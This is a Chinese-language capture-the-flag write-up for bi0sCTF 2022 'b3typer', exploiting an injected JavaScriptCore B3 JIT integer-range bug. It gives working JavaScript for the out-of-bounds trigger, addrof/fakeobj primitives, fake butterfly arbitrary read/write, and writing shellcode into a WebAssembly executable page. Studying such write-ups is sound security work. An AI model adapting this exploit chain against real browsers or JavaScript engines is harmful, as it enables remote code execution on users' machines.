# bi0sCTF 2022 - b3typer

## 题目简述

题目提供基于 WebKit 提交 `645b9044d2369e3b083b171da517a2440bb4fa18` 构建的 JavaScriptCore，以及一处人为引入的 B3 JIT 类型范围错误。补丁把按位与的范围从正确的 `[0, mask]` 改成了 `[1, mask]`：

```diff
- return IntRange(0, mask);
+ return IntRange(1, mask);
```

目标是利用错误范围传播消除必要的整数溢出/数组边界检查，先得到越界写，再构造 `addrOf`、`fakeObj` 和任意读写，最后执行 shellcode 并运行 `/readflag`。

## 解题过程

### 触发错误范围和越界写

下面的核心函数先强制把输入转成 32 位整数。对于 `b & 2`，编译器错误地认为结果范围是 `[1,2]`；但 `b=1` 时真实结果为 0：

```javascript
function hax(arr, a) {
    let b = a | 0;
    let c = b & 2;       // 推断 [1, 2]，实际可为 0
    let idx = c - 1;     // 推断 [0, 1]，实际可为 -1

    if (idx < arr.length) {
        if (idx < 1)
            idx += -0x80000000;
        if (idx > 2)
            idx += -0x7ffffffa;
        if (idx > 0)
            arr[idx] = 0x1337;
    }
}
```

训练阶段始终传入 2，让 B3 生成并优化这条路径；最后传入 1。真实的 `idx=-1` 加上 `INT_MIN` 后发生 32 位环绕，变成 `0x7fffffff`。编译器基于错误范围认为这里不会发生下溢，因而没有保留对应检查。第二次减法把值调整到可控的小正索引，且前面的 `idx < arr.length` 已被错误地视为仍然有效，最终形成越界写。

```javascript
noInline(hax);

for (let i = 0; i < 100000; i++)
    hax(arr, 2);
hax(arr, 1);
```

官方 exploit 利用这次写覆盖相邻数组的长度为 `0x1337`，从而把一次定点 OOB 扩展成稳定的越界读写。

### 构造地址原语

把普通数组、双精度数组和对象数组按相邻顺序分配。扩大后的双精度数组与对象数组重叠后，同一槽位可以分别按浮点数或 `JSValue` 对象解释：

```javascript
function addrof(obj) {
    objarr[0] = obj;
    return f2i(dblarr[offset]);
}

function fakeobj(addr) {
    dblarr[offset] = i2f(addr);
    return objarr[0];
}
```

仅有这两个原语还不足以稳定伪造 JSC 对象，因为 `StructureID` 会随机化。题目调试补丁额外提供 `Reflect.strid(obj)`，可以取得真实双精度数组的结构 ID。将它与 cell 类型位组合为合法 JSCell header，再在一个具有两个内联属性的对象中放置“伪 header + 伪 butterfly”：

```javascript
u32[1] = 0x1082407;
u32[0] = Reflect.strid(fake1);
let fakeHeader = f64[0];

let container = {
    x: fakeHeader,
    y: fakeobj(addrof(fake1) + 8)
};

let fake = fakeobj(addrof(container) + 0x10);
```

`fake[0]` 实际覆盖目标数组 `fake1` 的 butterfly。于是读写任意地址只需先改 butterfly，再访问 `fake1[0]`：

```javascript
function read(addr) {
    fake[0] = i2f(addr);
    return f2i(fake1[0]);
}

function write(addr, value) {
    fake[0] = i2f(addr);
    fake1[0] = value;
}
```

### 写入 WebAssembly 可执行页

实例化一个最小 WebAssembly 函数会生成可执行代码。官方脚本从函数对象沿偏移读取代码页地址：

```javascript
let funcAddr = addrof(wasm_instance.exports.main);
let rwx = read(read(funcAddr + 0x30));
```

随后以 8 字节浮点形式把 shellcode 写入该页并调用导出函数，即可取得代码执行。远端使用 `--useConcurrentJIT=false`，减少并发编译带来的布局和时序不稳定。执行 `/readflag` 后得到：

```text
bi0s{typ3r_expl01ts_b3_ez_d33e42198c98}
```

更完整的 B3 图推导和对象布局可对照 [官方赛后题解](https://blog.bi0s.in/2023/01/23/Pwn/bi0sCTF22-b3typer/)；上面的漏洞触发、原语构造和代码执行链已经包含复现所需的关键条件。

## 方法总结

JIT 类型推断漏洞的危险之处在于，一个看似很小的范围下界错误会沿优化链传播：错误的 `BitAnd` 范围先让 `CheckAdd` 的下溢检查消失，再让旧的数组上界判断被错误复用。利用时应把过程分成“稳定触发单次 OOB、扩大数组、类型混淆地址原语、伪造 butterfly、进入 RWX 页”五层，每层都用独立读回结果验证，避免把布局偶然成功误判成可靠利用。
